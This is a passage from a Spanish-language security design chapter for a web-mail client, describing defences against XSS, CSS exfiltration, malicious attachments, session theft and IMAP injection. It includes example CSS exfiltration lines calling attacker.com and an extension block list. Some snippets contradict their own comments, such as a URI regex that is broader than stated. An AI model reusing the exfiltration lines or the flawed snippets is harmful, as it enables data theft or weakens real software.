## 9. Seguridad: Defensa en Capas

El historial reciente de vulnerabilidades en clientes webmail establece un escenario de amenaza que no admite compromisos. Roundcube acumuló más de 15 CVE durante el primer semestre de 2026, incluyendo explotación activa por el grupo APT28 (Fancy Bear) vinculado al Kremlin, quienes mediante la "Operación RoundPress" insertaron JavaScript malicioso en correos HTML para exfiltrar contactos, reenviar mensajes y establecer reglas Sieve persistentes que sobrevivían a cambios de contraseña [^55^]. CVE-2026-35539 demostró XSS a través de adjuntos HTML con puntuación CVSS 6.1 — bastaba con previsualizar un archivo `text/html` para que el ataque se ejecutara [^76^][^79^]. Zimbra, por su parte, mantuvo más de 10.500 servidores sin parchear ante CVE-2025-48700, una vulnerabilidad de XSS almacenado que se activaba simplemente al visualizar un correo manipulado [^51^].

Estos incidentes comparten una causa raíz común: la renderización de contenido HTML no confiable sin sanitización adecuada en múltiples capas. Webmail 6.0 aborda este problema mediante una arquitectura de defensa en profundidad que nunca depende de un único mecanismo de protección.

### 9.1 Matriz de Amenazas y Mitigaciones

La siguiente tabla consolida las ocho clases de amenaza principales identificadas para un cliente webmail moderno, con su vector de ataque, impacto estimado y las contramedidas específicas que Webmail 6.0 implementa.

| Amenaza | Vector | Impacto | Mitigación Webmail 6.0 | Referencia |
|---------|--------|---------|----------------------|------------|
| XSS via email HTML | Adjunto `text/html` o cuerpo de correo con `<script>`, handlers inline, SVG `<animate>` | Robo de sesión, keylogging, CSRF forzado | DOMPurify server-side + CSP estricto (`nonce` + `strict-dynamic`) + iframe `sandbox` | CVE-2026-35539 CVSS 6.1 [^76^]; APT28 [^55^] |
| CSS malicioso | `@import` con URL externa, selectores que exfiltran datos vía requests GET | Exfiltración de contenido, UI redressing | Juice (CSS inlining) + whitelist de propiedades permitidas, bloqueo de `@import` | Zimbra bypass [^51^] |
| Adjuntos maliciosos | Ejecutables disfrazados (.pdf.exe), macros Office, EICAR | Compromiso de endpoint, ransomware | Restricción MIME-type stricta, magic numbers, ClamAV opcional, sandbox 25 MB | CVE-2025-68461 [^54^] |
| Credenciales IMAP expuestas | Dump de base de datos, backup no cifrado | Acceso total a correos del usuario | AES-256-GCM a nivel de campo vía `mongoose-aes-encryption`, key 32 bytes, IV 12 bytes único | [^108^][^154^] |
| Secuestro de sesión | XSS que roba `localStorage`, sniffing de token JWT | Suplantación de identidad persistente | BFF pattern: access token en memoria (15 min), refresh token en HttpOnly cookie + Redis server-side | [^44^][^57^] |
| Fuerza bruta / abuso de API | Login masivo, scraping de IMAP, DoS | Bloqueo de cuentas, degradación de servicio | Redis sliding window (ZSET), 99.997% precisión, límites duales por IP y usuario | [^48^][^67^] |
| IMAP injection | CRLF en argumentos de comando IMAP, Symbol poisoning | Ejecución de comandos IMAP arbitrarios | Validación estricta con whitelist, stripping de `\r` y `\n`, uso de imapflow (no concatenación manual) | CVE-2026-42258 [^47^] |
| Subida de archivos | Bypass de extensión, path traversal, archivos gigantes | RCE, llenado de disco, hosting de malware | Límite 25 MB, magic numbers (`file-type`), nombres UUID, almacenamiento S3 aislado | OWASP [^89^] |

#### 9.1.1 XSS via email: DOMPurify server-side + CSP estricto + sandboxed iframe

El ataque XSS representa la amenaza número uno contra clientes webmail porque el contenido HTML de un correo es, por definición, no confiable. La explotación de Roundcube por APT28 utilizó etiquetas SVG `<animate>` con handlers de eventos `onbegin` que el filtro existente no detectaba, permitiendo la ejecución de JavaScript en el contexto de la sesión del usuario [^54^][^55^].

Webmail 6.0 implementa tres capas independientes de protección:

**Capa 1 — Sanitización server-side con DOMPurify.** Todo contenido HTML que transita por el backend se procesa mediante `isomorphic-dompurify` (variante de DOMPurify que funciona en Node.js a través de `jsdom`, no `happy-dom` por diferencias en el parsing de HTML que podrían introducir bypasses). DOMPurify, mantenido por Cure53, opera creando un nodo DOM, dejando que el navegador (o jsdom) parsee el HTML, y luego recorriendo el árbol DOM para eliminar elementos y atributos peligrosos [^69^][^64^]. Es fundamentalmente más seguro que enfoques basados en expresiones regulares porque aprovecha el parser del navegador, evitando técnicas de obfuscación que engañan a regex.

La configuración para el pipeline de email restringe drásticamente los elementos permitidos:

```javascript
import DOMPurify from 'isomorphic-dompurify';

const EMAIL_CONFIG = {
  ALLOWED_TAGS: [
    'p', 'br', 'strong', 'em', 'u', 's', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
    'ul', 'ol', 'li', 'a', 'img', 'table', 'thead', 'tbody', 'tr', 'td', 'th',
    'div', 'span', 'blockquote', 'pre', 'code', 'hr', 'sup', 'sub', 'center'
  ],
  ALLOWED_ATTR: [
    'href', 'title', 'alt', 'src', 'width', 'height', 'style', 'colspan',
    'rowspan', 'align', 'valign', 'bgcolor', 'color', 'face', 'size'
  ],
  ALLOW_DATA_ATTR: false,
  SANITIZE_DOM: true,
  // Permitir solo URLs http/https/mailto/cid en enlaces e imágenes
  ALLOWED_URI_REGEXP: /^(?:(?:(?:f|ht)tps?|mailto|tel|callto|cid|blob|chrome|x-moz-|ms-appx|ms-appx-web|\/\/|\/|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i,
  // Eliminar todo contenido de <script> y <style> antes del parsing
  KEEP_CONTENT: true
};

const clean = DOMPurify.sanitize(untrustedHtml, EMAIL_CONFIG);
```

DOMPurify elimina elementos como `<script>`, `<iframe>`, `<object>`, `<embed>`, `<form>`, y event handlers inline (`onclick`, `onerror`, `onload`, `onbegin` en SVG). Sin embargo, CVE-2025-15599 demostró que incluso DOMPurify puede tener bypasses, lo que justifica las capas adicionales [^53^].

**Capa 2 — Content Security Policy estricta con nonces.** La respuesta HTTP que entrega el contenido del email incluye headers CSP que previenen la ejecución de scripts incluso si un atacante logra inyectar JavaScript que DOMPurify no detectó:

```
Content-Security-Policy: default-src 'none'; script-src 'nonce-{random}' 'strict-dynamic'; style-src 'nonce-{random}' 'unsafe-inline'; img-src 'self' cid: data: https:; font-src 'none'; object-src 'none'; base-uri 'none'; frame-ancestors 'self'; form-action 'none'
```

El nonce es un valor criptográficamente aleatorio de 128 bits generado por el backend para cada respuesta, inyectado en las etiquetas `<style>` legítimas del email renderizado. Un atacante no puede predecir el nonce, por lo que cualquier `<script>` inyectado no cumple la directiva `script-src` y el navegador lo bloquea [^109^][^115^]. La directiva `strict-dynamic` permite que scripts confiados (los que tienen el nonce) carguen otros scripts dinámicamente sin restricciones adicionales, simplificando la gestión de dependencias.

**Capa 3 — Sandboxed iframe.** El contenido HTML del correo se renderiza dentro de un `<iframe sandbox="allow-same-origin">` con atributo `srcdoc`. El atributo `sandbox` desactiva por defecto: scripts, formularios, popups, modales, el API de permisos y el acceso al storage del parent. Incluso si el CSP fallara y DOMPurify dejara pasar un `<script>`, el sandbox del iframe previene la ejecución en el contexto de la aplicación principal [^79^][^113^].

#### 9.1.2 CSS malicioso: Juice + whitelist CSS

Los estilos CSS pueden servir como canal de exfiltración de datos. Un atacante puede usar selectores como `input[value^="a"] { background: url(https://attacker.com/leak?a) }` para extraer carácter por carácter el valor de campos de formulario, o `@import url("https://attacker.com/tracker.css")` para registrar la apertura de un correo desde una IP específica.

Webmail 6.0 utiliza **Juice** para inlinear CSS antes de la sanitización. Juice convierte reglas CSS en atributos `style` inline, que luego son filtradas por DOMPurify. Posteriormente, un segundo paso de filtrado elimina propiedades CSS potencialmente peligrosas:

```javascript
const ALLOWED_CSS_PROPS = new Set([
  'color', 'background-color', 'font-family', 'font-size', 'font-weight',
  'font-style', 'text-decoration', 'text-align', 'line-height', 'margin',
  'padding', 'border', 'width', 'height', 'max-width', 'display',
  'vertical-align', 'border-collapse', 'border-spacing'
]);
// Bloquear: @import, behavior, -moz-binding, expression(), url() con HTTP
```

Juice es el estándar de facto para CSS inlining en correos electrónicos, requerido porque la mayoría de clientes de email ignoran o eliminan hojas de estilo externas y `<style>` blocks [^121^][^117^].

#### 9.1.3 Adjuntos: restricción MIME, magic numbers, ClamAV opcional

Los adjuntos representan un vector de propagación de malware directo. La estrategia de Webmail 6.0 se basa en múltiples capas de validación aplicadas en secuencia estricta:

1. **Validación declarativa del nombre de archivo:** El backend rechaza archivos con extensiones de riesgo conocido: `.exe`, `.dll`, `.bat`, `.cmd`, `.sh`, `.js`, `.vbs`, `.ps1`, `.jar`, `.apk`, `.scr`, `.com`, `.msi`. Las extensiones dobles (`.pdf.exe`) se detectan inspeccionando el último componente separado por punto.

2. **Verificación de magic numbers:** La librería `file-type` lee los primeros bytes del archivo y compara su firma mágica contra el MIME-type declarado. Un archivo que declara `Content-Type: application/pdf` pero cuyos primeros bytes comienzan con `MZ` (ejecutable Windows) se rechaza inmediatamente.

3. **Restricción de tamaño:** Límite absoluto de 25 MB por archivo, configurable por instancia. Este límite alinea con las restricciones de los principales proveedores de email (Gmail impone 25 MB para adjuntos no-BASE64).

4. **Escaneo antivirus opcional (ClamAV):** Cuando está habilitado, los adjuntos se escanean vía `clamd` (daemon ClamAV) antes de almacenarse. ClamAV soporta formatos de archivo, archivos comprimidos (ZIP, TAR, GZIP, BZIP2), ejecutables (ELF, PE) y documentos de Office [^59^][^65^]. La cadena de prueba EICAR sirve para validar la integridad del pipeline de escaneo sin utilizar malware real.

#### 9.1.4 Credenciales IMAP: AES-256-GCM en reposo

Las credenciales IMAP (contraseñas y tokens OAuth2) se almacenan en MongoDB cifradas con AES-256-GCM (Galois/Counter Mode), un algoritmo de cifrado autenticado (AEAD) que proporciona tanto confidencialidad como integridad. El módulo `crypto` de Node.js implementa AES-256-GCM nativamente [^108^][^118^].

Webmail 6.0 utiliza el plugin `mongoose-aes-encryption`, que cifra transparentemente campos designados del schema antes de persistirlos [^154^]:

```javascript
import createAESPlugin from 'mongoose-aes-encryption';

const plugin = createAESPlugin({
  key: Buffer.from(process.env.IMAP_CREDENTIALS_KEY, 'hex') // 32 bytes
});

const accountSchema = new Schema({
  email: { type: String, required: true },
  imapHost: { type: String, required: true },
  imapPort: { type: Number, default: 993 },
  imapPassword: { type: String, encrypted: true },
  oauth2AccessToken: { type: String, encrypted: true },
  oauth2RefreshToken: { type: String, encrypted: true },
});
accountSchema.plugin(plugin, { fields: ['imapPassword', 'oauth2AccessToken', 'oauth2RefreshToken'] });
```

Los parámetros criptográficos son críticos: la clave debe tener exactamente 32 bytes (256 bits), generada con `crypto.randomBytes(32)` y almacenada en una variable de entorno o KMS. El IV (vector de inicialización) debe ser único por operación de cifrado, tener 12 bytes para GCM, y generarse con `crypto.randomBytes(12)`. Reutilizar un IV con la misma clave en GCM compromete completamente la confidencialidad del cifrado [^119^].

#### 9.1.5 Sesiones: JWT 15 min + refresh en Redis/HttpOnly cookies

El patrón de autenticación sigue el estándar Backend-for-Frontend (BFF) que Auth0, Clerk, Supabase y la mayoría de proveedores de autenticación modernos han adoptado como consenso en 2026 [^44^][^57^]:

- **Access Token:** JWT firmado con RS256 (par de claves RSA-2048), tiempo de vida 15 minutos, almacenado exclusivamente en memoria del frontend (variable JavaScript, nunca `localStorage`). Se transmite en el header `Authorization: Bearer <token>`. Al cerrar o refrescar la página, el access token desaparece y debe recuperarse mediante un silent refresh.

- **Refresh Token:** Token opaco de 128 bits (no JWT), tiempo de vida 7 días, almacenado server-side en Redis con TTL automático (SETEX). Se entrega al cliente en una cookie HTTP-only, Secure, SameSite=Strict, con scope limitado al endpoint `/auth/refresh`:

```
Set-Cookie: refresh_token=<opaque_token>; HttpOnly; Secure; SameSite=Strict; Path=/auth/refresh; Max-Age=604800
```

Este diseño mitiga XSS de manera efectiva: un script malicioso no puede leer el refresh token porque es HttpOnly, y no puede extraer el access token de localStorage porque nunca se almacena allí [^44^].

#### 9.1.6 Rate limiting: Redis sliding window 99.997% precisión

Los endpoints de autenticación e IMAP son objetivos prioritarios para ataques de fuerza bruta. Webmail 6.0 implementa rate limiting distribuido mediante Redis Sorted Sets (ZSET) usando el algoritmo sliding window, que según pruebas de Cloudflare alcanza un 99.997% de precisión con un consumo de memoria drásticamente inferior al de un log completo [^48^][^67^].

El algoritmo opera como sigue: cada petición se registra en un ZSET con el timestamp como score. Antes de aceptar una nueva petición, se ejecuta `ZREMRANGEBYSCORE` para eliminar entradas anteriores al inicio de la ventana temporal, y `ZCARD` para contar las peticiones dentro de la ventana actual. Si el conteo excede el límite, la petición se rechaza con código 429 [^156^].

La configuración de Fastify utiliza el plugin `@fastify/rate-limit` con backend Redis:

```javascript
await fastify.register(import('@fastify/rate-limit'), {
  max: 100,              // 100 requests por ventana
  timeWindow: '1 minute',
  redis: redisClient,    // Instancia ioredis
  keyGenerator: (req) => `${req.ip}:${req.user?.id || 'anonymous'}`,
  errorResponseBuilder: (req, context) => ({
    statusCode: 429,
    error: 'Too Many Requests',
    retryAfter: context.after
  })
});
```

Los límites específicos por endpoint son: login (5 intentos/minuto por IP), refresh token (10/minuto por usuario), IMAP fetch (200/minuto por cuenta), búsqueda (60/minuto por usuario).

#### 9.1.7 IMAP injection: validación estricta, stripping CRLF

La inyección de comandos IMAP ocurre cuando input del usuario se concatena directamente en comandos IMAP sin sanitización. CVE-2026-42258 en la librería `net-imap` de Ruby demostró que caracteres `\r\n` (CRLF) embebidos en argumentos de tipo Symbol permitían inyectar comandos IMAP arbitrarios, como `DELETE` o `RENAME`, con los privilegios de la cuenta comprometida [^47^].

Webmail 6.0 mitiga este riesgo en tres frentes: (1) toda interacción IMAP pasa por `imapflow`, que nunca expone concatenación manual de comandos [^1^]; (2) toda entrada de usuario que eventualmente se use en parámetros IMAP pasa por validación de whitelist que rechaza caracteres no alfanuméricos excepto puntos, guiones y arrobas en direcciones de email; (3) un paso de stripping elimina explícitamente todos los caracteres `\r` (0x0D) y `\n` (0x0A) antes de cualquier operación IMAP [^50^].

#### 9.1.8 Subida de archivos: límite 25MB, magic numbers

El endpoint de subida de archivos aplica las siguientes restricciones: tamaño máximo 25 MB (configurable), validación de magic numbers contra la extensión declarada, renombrado a UUID v4 para eliminar path traversal en nombres de archivo, almacenamiento en bucket S3 aislado sin capacidad de ejecución, y firma SHA-256 calculada en stream para detectar corrupción o manipulación durante la transferencia.

### 9.2 Arquitectura de Autenticación BFF

El patrón Backend-for-Frontend (BFF) se ha consolidado en 2026 como el estándar de seguridad para SPAs que manejan datos sensibles. A diferencia del modelo tradicional donde tanto access como refresh tokens se almacenan en `localStorage` (vulnerable a XSS), el BFF almacena solo el access token en memoria volátil y mantiene el refresh token en una cookie HttpOnly inaccesible para JavaScript [^44^][^57^].

#### 9.2.1 Access token 15-30 min en memoria

El frontend almacena el JWT access token en una variable JavaScript (por ejemplo, en un closure o módulo ES6 no exportado). Este token tiene las siguientes características: algoritmo de firma RS256 con clave privada en el backend y clave pública rotativa; claims estándar (`sub`, `iat`, `exp`, `jti`) más claims de aplicación (`accountId`, `email`); tiempo de vida 15 minutos (900 segundos); claim `jti` (JWT ID) único por token para permitir revocación puntual.

Al refrescar la página, el access token se pierde. El frontend ejecuta automáticamente un "silent refresh": realiza una petición POST al endpoint `/auth/refresh` con la cookie HttpOnly que contiene el refresh token. Si el refresh token es válido y no ha sido revocado, el backend emite un nuevo par de tokens.

#### 9.2.2 Refresh token 7-14 días server-side Redis, HTTP-only cookie

El refresh token es un token opaco de 128 bits generado con `crypto.randomBytes(16).toString('hex')`. Su ciclo de vida se gestiona completamente en el backend:

```javascript
// Almacenamiento en Redis con TTL
await redis.setex(`refresh:${userId}:${tokenId}`, 604800, JSON.stringify({
  familyId,           // Identificador de familia de tokens
  issuedAt: Date.now(),
  userAgent: req.headers['user-agent'],
  ipAddress: req.ip
}));
```

La cookie que transporta el refresh token al navegador tiene los siguientes atributos de seguridad: `HttpOnly` (inaccesible para `document.cookie` en JavaScript), `Secure` (solo se transmite por HTTPS), `SameSite=Strict` (no se envía en peticiones cross-origin), `Path=/auth/refresh` (scope limitado al endpoint de refresh).

#### 9.2.3 Rotación con token families, detección de reúso

La rotación de refresh tokens es obligatoria: cada vez que un refresh token se utiliza para obtener un nuevo access token, se genera un nuevo refresh token y el anterior se marca como consumido. Esto limita la ventana de oportunidad para un atacante que robe un refresh token [^157^].

El sistema de familias de tokens agrupa todos los refresh tokens emitidos a partir de un mismo login inicial bajo un `familyId` compartido. Si un refresh token ya consumido se utiliza nuevamente (indicando un posible robo), toda la familia se revoca inmediatamente y el usuario debe re-autenticarse:

```javascript
async function rotateRefreshToken(oldTokenId, familyId) {
  const oldToken = await redis.get(`refresh:${oldTokenId}`);
  if (!oldToken || oldToken.status === 'revoked') {
    // Posible reúso detectado: revocar toda la familia
    await revokeFamily(familyId);
    throw new SecurityError('Token reuse detected. Full re-authentication required.');
  }
  // Marcar como consumido, emitir nuevo token
  await redis.setex(`refresh:${oldTokenId}`, 604800, JSON.stringify({ ...oldToken, status: 'consumed' }));
  const newTokenId = crypto.randomBytes(16).toString('hex');
  await redis.setex(`refresh:${newTokenId}`, 604800, JSON.stringify({ familyId, status: 'active' }));
  return newTokenId;
}
```

### 9.3 HTML Sanitization Pipeline

El pipeline de sanitización de HTML es la pieza crítica que diferencia a Webmail 6.0 de clientes vulnerables como Roundcube. Opera como una cadena de procesamiento secuencial donde cada etapa recibe la salida de la anterior.

#### 9.3.1 DOMPurify con jsdom (no happy-dom)

La elección de `jsdom` sobre `happy-dom` como entorno DOM subyacente no es arbitraria. DOMPurify depende del parser HTML del navegador para construir el árbol DOM que luego recorre y limpia. `jsdom` utiliza el parser HTML5 de estándar de la WHATWG, mientras que `happy-dom` implementa su propio parser con optimizaciones de rendimiento que pueden diferir sutilmente en el manejo de HTML malformado o técnicas de obfuscación [^53^]. En seguridad, la conformidad estricta con el estándar es prioritaria sobre la velocidad.

El pipeline completo para un correo HTML entrante:

```javascript
async function sanitizeEmailHtml(rawHtml) {
  // Paso 1: Inlinear CSS externo con Juice
  const inlined = juice(rawHtml, { webResources: { images: false } });

  // Paso 2: Sanitizar con DOMPurify sobre jsdom
  const sanitized = DOMPurify.sanitize(inlined, EMAIL_CONFIG);

  // Paso 3: Filtrar propiedades CSS peligrosas del style inline
  const filtered = filterCssProperties(sanitized, ALLOWED_CSS_PROPS);

  // Paso 4: Inyectar nonce CSP y envolver en sandboxed iframe
  return wrapInSandbox(filtered, generateNonce());
}
```

#### 9.3.2 Configuración allowedTags/allowedAttributes

La lista blanca de elementos HTML permitidos se basa en el subconjunto seguro identificado por OWASP y Cure53. Elementos activos como `<script>`, `<iframe>`, `<object>`, `<embed>`, `<form>`, `<input>`, `<button>`, `<textarea>`, `<select>`, `<style>` se eliminan por completo. De los atributos permitidos, se excluyen todos los event handlers inline (`onclick`, `onerror`, `onload`, `onmouseover`, etc.) y atributos de datos (`data-*`) que podrían usarse para almacenar payloads.

Para enlaces (`<a>`), el atributo `target` se fuerza a `_blank` con `rel="noopener noreferrer"` para prevenir tabnabbing. Las URLs de `href` se validan contra una expresión regular que solo permite esquemas `http://`, `https://`, `mailto:`, `tel:` y `cid:` (para imágenes inline de correo).

#### 9.3.3 CSP nonces + Trusted Types

En navegadores que soportan Trusted Types (Chromium 83+, Firefox en desarrollo), Webmail 6.0 activa la política adicional `require-trusted-types-for 'script'`, que obliga a que todo HTML insertado en el DOM pase por un policy de Trusted Types validado. Esto elimina clases enteras de ataques DOM XSS donde un atacante inyecta HTML a través de métodos como `innerHTML` o `document.write` [^89^].

```javascript
if (window.trustedTypes && window.trustedTypes.createPolicy) {
  window.trustedTypes.createPolicy('email-sanitizer', {
    createHTML: (input) => DOMPurify.sanitize(input, EMAIL_CONFIG)
  });
}
```

### 9.4 Encriptación de Datos Sensibles

#### 9.4.1 mongoose-aes-encryption plugin

El plugin `mongoose-aes-encryption` proporciona cifrado transparente a nivel de campo para schemas Mongoose [^154^]. La aplicación lee y escribe valores en texto plano mientras únicamente ciphertext (texto cifrado) persiste en MongoDB. Esto protege las credenciales IMAP incluso si la base de datos se ve comprometida mediante un dump o acceso no autorizado.

El plugin se aplica al schema designando qué campos deben cifrarse:

```javascript
import createAESPlugin from 'mongoose-aes-encryption';

const plugin = createAESPlugin({
  key: process.env.ENCRYPTION_KEY // Buffer de 32 bytes
});

schema.plugin(plugin, {
  fields: ['imapPassword', 'oauth2AccessToken', 'oauth2RefreshToken'],
  sensitive: true  // Excluir de logs y JSON.stringify por defecto
});
```

#### 9.4.2 AES-256-GCM: key 32 bytes, IV 12-16 bytes único

AES-256-GCM (Galois/Counter Mode) es el modo de operación recomendado porque proporciona cifrado autenticado (AEAD): además de ocultar el contenido, detecta cualquier modificación del ciphertext. Los parámetros son no negociables:

| Parámetro | Valor | Descripción |
|-----------|-------|-------------|
| Algoritmo | AES-256-GCM | Cifrado autenticado con tag de 128 bits |
| Key | 32 bytes (256 bits) | Generada con `crypto.randomBytes(32)` |
| IV | 12 bytes (96 bits) | Único por operación; nunca reutilizado con la misma key |
| Auth Tag | 16 bytes (128 bits) | Generado automáticamente por GCM; verificado en decrypt |
| Key Derivation | HKDF-SHA256 | Para derivar keys de contextos diferentes |

La reutilización de un IV con la misma clave en AES-GCM es catastrófica: un atacante con dos ciphertexts cifrados con el mismo IV puede recuperar el XOR de los plaintexts originales, y potencialmente forjar mensajes autenticados. Por ello, Webmail 6.0 genera un IV criptográficamente aleatorio de 12 bytes para cada operación de cifrado usando `crypto.randomBytes(12)` [^108^][^119^].

#### 9.4.3 Key management: env dev, KMS producción

La gestión de claves de cifrado sigue el principio de separación de secretos:

- **Desarrollo local:** La clave maestra se almacena en variable de entorno `ENCRYPTION_KEY` como hex string de 64 caracteres (32 bytes). El archivo `.env` se incluye en `.gitignore` con reglas estrictas.

- **Producción:** La clave maestra se almacena en un Key Management Service (KMS) como AWS Secrets Manager, HashiCorp Vault o Azure Key Vault. El backend obtiene la clave en tiempo de arranque y la mantiene en memoria. Nunca se persiste en disco ni en logs.

- **Rotación de claves:** Cuando se rota la clave maestra, los registros existentes se descifran con la clave anterior y se recifran con la nueva. Este proceso opera como un job de fondo de baja prioridad en BullMQ para no impactar el servicio en producción.

- **Clave de encriptación de datos (DEK) vs clave de encriptación de claves (KEK):** En configuraciones enterprise, se implementa envelope encryption: cada cuenta de usuario tiene su propia DEK generada aleatoriamente, y esta DEK se cifra con la KEK maestra almacenada en el KMS. Esto permite la rotación de la KEK sin recifrar todos los datos de usuario [^119^].
